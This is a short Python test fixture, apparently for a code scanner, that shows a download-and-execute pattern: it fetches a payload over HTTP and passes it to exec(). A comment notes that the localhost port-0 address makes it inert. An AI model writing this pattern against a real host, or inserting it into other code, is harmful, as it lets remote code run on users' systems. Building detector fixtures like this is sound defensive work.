# Fixture: PYAST-005 — fetch payload then exec. Inert: localhost port 0 fetches nothing.
import urllib.request
payload = urllib.request.urlopen("http://127.0.0.1:0/synthetic").read()
exec(payload)
